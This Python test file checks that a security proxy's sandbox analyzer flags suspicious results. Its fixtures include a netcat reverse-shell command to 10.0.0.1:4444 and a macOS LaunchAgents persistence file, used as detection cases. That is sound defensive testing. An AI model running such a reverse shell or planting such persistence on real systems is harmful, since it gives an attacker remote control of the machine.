from __future__ import annotations

import json

from cc_security_proxy.sandbox.rules import SandboxResult, analyze


def test_clean_sandbox_result():
    result = SandboxResult(
        exit_code=0,
        stdout="Hello, world!",
        stderr="",
        files_created=[],
        files_modified=[],
        network_attempts=[],
        processes_spawned=[],
    )
    assert analyze(result) == []


def test_startup_folder_write_detected():
    result = SandboxResult(
        exit_code=0,
        stdout="",
        stderr="",
        files_created=[
            "/Users/sandbox/Library/LaunchAgents/com.evil.plist",
        ],
        files_modified=[],
        network_attempts=[],
        processes_spawned=[],
    )
    findings = analyze(result)
    assert len(findings) >= 1
    assert any("LaunchAgents" in f for f in findings)


def test_network_attempt_detected():
    result = SandboxResult(
        exit_code=0,
        stdout="",
        stderr="",
        files_created=[],
        files_modified=[],
        network_attempts=["connection to 10.0.0.1:4444"],
        processes_spawned=[],
    )
    findings = analyze(result)
    assert len(findings) >= 1


def test_suspicious_process_detected():
    result = SandboxResult(
        exit_code=0,
        stdout="",
        stderr="",
        files_created=[],
        files_modified=[],
        network_attempts=[],
        processes_spawned=["nc -e /bin/bash 10.0.0.1 4444"],
    )
    findings = analyze(result)
    assert len(findings) >= 1
    assert any("nc" in f.lower() for f in findings)


def test_summary():
    result = SandboxResult(
        exit_code=1,
        stdout="out",
        stderr="err",
        files_created=["/tmp/test"],
        files_modified=[],
        network_attempts=["attempt"],
        processes_spawned=["evil"],
        timed_out=True,
    )
    summary = result.summary()
    assert "exit_code=1" in summary
    assert "TIMED_OUT" in summary
